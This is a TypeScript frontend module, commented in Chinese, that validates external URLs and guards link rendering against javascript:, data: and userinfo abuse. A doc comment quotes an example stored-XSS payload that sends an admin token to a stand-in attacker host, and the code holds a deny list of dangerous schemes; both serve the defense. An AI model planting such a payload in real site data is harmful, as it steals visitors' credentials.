/**
 * 通用外部 URL 安全策略（H9 / H2 共享内核）。
 *
 * 所有把**外部可控数据**交给 `window.open` / `location.href` /
 * `targetWindow.location` 的地方，都必须先过 `classifyExternalUrl`：
 *
 *  - **Web 跳转只允许 HTTPS**；开发环境按明确规则允许 localhost HTTP
 *    （仅当 `import.meta.env.DEV === true` 或 `MODE === 'development'`）；
 *  - **自定义 scheme 只在显式 allowlist 中放行**（支付 scheme 仅在支付
 *    调用点传入 `allowSchemes`，普通外链不传 → 一律拒绝非 http(s) scheme）；
 *  - **拒绝**：`javascript:` / `data:` / `file:` / `blob:` / `vbscript:` /
 *    协议相对（`//`）/ userinfo（`user:pass@`）/ 控制字符 / 空值 / 缺失 host；
 *  - **新窗口一律 `noopener,noreferrer`**（`openExternalUrl`）。
 *
 * 理由：`window.location.href = 'javascript:...'` 在目标窗口里能读到本应用
 * token；`window.open('about:blank')` 再 `location.replace('javascript:...')`
 * 的窗口继承 opener 的 origin，同样等于同源脚本执行。见上一轮 m051 F4。
 */

export interface UrlDecision {
  ok: boolean
  kind: 'web' | 'scheme' | null
  reason?: string
}

// 运行时构造，避免在源码里出现控制字符字面量/转义（eslint no-control-regex）。
const CONTROL_CHAR_RE = new RegExp(
  `[${String.fromCharCode(0)}-${String.fromCharCode(0x1f)}${String.fromCharCode(0x7f)}]`
)
/** 捕获 scheme 与剩余部分；`s` 标志让 `.` 匹配换行。 */
const SCHEME_RE = /^([a-zA-Z][a-zA-Z0-9+.-]*):(.*)$/s

/**
 * 校验 URL 是否携带 userinfo（`scheme://user:pass@host`）。
 *
 * 始终用**完整 URL** 交给 `new URL` 解析——不能先把 scheme 剥掉再解析，
 * 那样 `new URL('//user:pass@host')` 会因缺失 scheme 抛错、退回的正则
 * 也只匹配 `scheme://` 开头，`//user:pass@host` 直接被放过。自定义 scheme
 * 走 `new URL` 解析 userinfo；非标准 scheme 构造失败时回退正则检查
 * authority 段是否含 `@`（fail-closed）。
 */
export function containsUserinfo(value: string): boolean {
  try {
    const url = new URL(value)
    if (url.username || url.password) return true
    // 非特殊 scheme 的 URL 解析器可能把 `user:pass@` 吞进 pathname，
    // 再核对一次 authority 段（带 @ 一律拒绝）。
    const authority = /^[a-zA-Z][a-zA-Z0-9+.-]*:\/\/([^/?#]*)/.exec(value)
    if (authority && authority[1].includes('@')) return true
  } catch {
    // 自定义 scheme 可能让 URL 构造器抛错；退回正则检查 authority 段。
    const authority = /^[a-zA-Z][a-zA-Z0-9+.-]*:\/\/([^/?#]*)/.exec(value)
    return Boolean(authority && authority[1].includes('@'))
  }
  return false
}

/** 开发环境 localhost HTTP：仅当明确处于开发模式且 host 为回环地址时放行。 */
export function isDevLocalhostHttp(raw: string): boolean {
  // import.meta.env.DEV 仅在 vite dev 构建为 true；生产构建与 esbuild 测试
  // （define 成 {}）都为 false → http 一律拒绝。
  if (!(import.meta.env?.DEV === true || import.meta.env?.MODE === 'development')) return false
  try {
    const url = new URL(raw)
    const host = url.hostname
    return host === 'localhost' || host === '127.0.0.1' || host === '::1'
  } catch {
    return false
  }
}

/**
 * 纯函数：把任意外部 URL 分类为可安全导航的 web / scheme，或给出拒绝原因。
 *
 * @param value         待校验值（字符串 / null / undefined / 数字等）
 * @param options.allowSchemes  允许的自定义 scheme 集合；只有支付等明确
 *                    需要拉起 App 的调用点才传（H9：支付 scheme 仅在支付
 *                     调用点可用，普通外链不传 → scheme 一律拒绝）。
 * @param options.allowHttp     允许任意 host 的 http（仅给 VPS 面板/VNC 等
 *                    运营方配置的 LAN/内网地址使用；普通外链与支付仍只允许
 *                    https / dev localhost http）。javascript:/data:/userinfo/
 *                    控制字符依旧一律拒绝，安全边界不受影响。
 * @param options.allowRelative 允许同源相对路径（`/` 开头且非 `//`，无控制
 *                    字符）。CMS 素材等后端生成相对路径的调用点才传；普通
 *                    外链与支付不传 → 相对路径按 missing-scheme 拒绝。
 * @returns 任何非 ok 结果都不得进入 `location.href` / `window.open`。
 */
export function classifyExternalUrl(
  value: unknown,
  options: { allowSchemes?: Set<string>; allowHttp?: boolean; allowRelative?: boolean } = {}
): UrlDecision {
  const raw = typeof value === 'string' ? value.trim() : ''
  if (!raw) return { ok: false, kind: null, reason: 'empty' }
  if (CONTROL_CHAR_RE.test(raw)) return { ok: false, kind: null, reason: 'control-char' }
  if (raw.startsWith('//')) return { ok: false, kind: null, reason: 'protocol-relative' }
  if (raw.startsWith('/')) {
    if (!options.allowRelative) return { ok: false, kind: null, reason: 'missing-scheme' }
    return { ok: true, kind: 'web' }
  }

  const match = SCHEME_RE.exec(raw)
  if (!match) return { ok: false, kind: null, reason: 'missing-scheme' }
  const scheme = match[1].toLowerCase()

  if (containsUserinfo(raw)) return { ok: false, kind: null, reason: 'userinfo' }

  if (scheme === 'https' || scheme === 'http') {
    // 用 URL 构造器确认 host 存在、结构合法（https:// 空 host、畸形串拒绝）。
    let url: URL
    try {
      url = new URL(raw)
    } catch {
      return { ok: false, kind: null, reason: 'invalid-url' }
    }
    if (!url.hostname) return { ok: false, kind: null, reason: 'missing-host' }
    if (scheme === 'http' && !options.allowHttp && !isDevLocalhostHttp(raw)) {
      return { ok: false, kind: null, reason: 'http-not-allowed' }
    }
    return { ok: true, kind: 'web' }
  }

  if (options.allowSchemes?.has(scheme)) {
    return { ok: true, kind: 'scheme' }
  }

  return { ok: false, kind: null, reason: 'scheme-not-allowed' }
}

/**
 * 模板 `<a :href>` 的渲染守卫。
 *
 * H9 只覆盖 `window.open` / `location.href` 的 JS 导航调用点；站点设置里的
 * `site_nav_items`、`beian_info_list.link_url`、footer 社交/栏目链接等**后端
 * 可控数据**会直接绑定进 `<a :href>`。攻击者把这些字段写成
 * `javascript:fetch('//attacker/x?'+localStorage.getItem('admin_token'))`
 * 后，任何访客点击链接就在**当前同源文档**执行脚本（`rel=noopener` 只约束
 * 新窗口 opener，拦不住 `javascript:` href），构成公共站点存储型 XSS。
 *
 * 该守卫是**纯渲染层兜底**：对同一来源 URL 逐字段判定，合法值原样返回，
 * 危险值返回 `#`（fail-closed，链接退化为不可点击），配合服务端写入校验
 * 形成双保险。
 *
 * 允许的形态：
 *  - 同源相对路径（`/` 开头且非 `//`）；
 *  - http(s) 外链（锚点链接无 token 泄漏风险，允许 http）；
 * 拒绝：`javascript:` / `data:` / `file:` / `blob:` / `vbscript:` / 协议相对 /
 * userinfo / 控制字符 / 空值 / 缺失 host。
 */
export function safeHref(
  value: unknown,
  options: { allowSchemes?: Set<string>; allowHttp?: boolean } = {}
): string {
  const raw = typeof value === 'string' ? value.trim() : ''
  if (!raw) return '#'
  if (CONTROL_CHAR_RE.test(raw)) return '#'
  if (raw.startsWith('//')) return '#'
  if (raw.startsWith('/')) return raw
  const decision = classifyExternalUrl(raw, { allowHttp: true, ...options })
  return decision.ok ? raw : '#'
}

export interface OpenExternalUrlOptions {
  /** 支付等需要额外 scheme allowlist 的调用点传入；普通外链省略。 */
  allowSchemes?: Set<string>
  /** 放行同源相对路径（/uploads/... 等后端生成的相对素材地址）。 */
  allowRelative?: boolean
  /** 校验失败时的回调（由调用方弹 toast），不传则只 console.warn。 */
  onInvalid?: (reason: string) => void
}

/**
 * 校验后新窗口打开外部链接：只接受 web 类（https / dev localhost http，
 * 或 `allowRelative` 放行的同源相对路径），一律 `noopener,noreferrer`。
 * scheme 类由支付层 `openPaymentUrl` 走 `location.href` 拉起 App，这里不做。
 */
export function openExternalUrl(value: unknown, options: OpenExternalUrlOptions = {}): boolean {
  const decision = classifyExternalUrl(value, {
    allowSchemes: options.allowSchemes,
    allowRelative: options.allowRelative
  })
  if (!decision.ok) {
    const reason = decision.reason || 'invalid'
    options.onInvalid?.(reason)
    console.warn('[UrlPolicy] blocked navigation:', reason)
    return false
  }
  if (decision.kind !== 'web') {
    const reason = 'scheme-not-navigable-here'
    options.onInvalid?.(reason)
    console.warn('[UrlPolicy] blocked navigation:', reason)
    return false
  }
  window.open(String(value).trim(), '_blank', 'noopener,noreferrer')
  return true
}
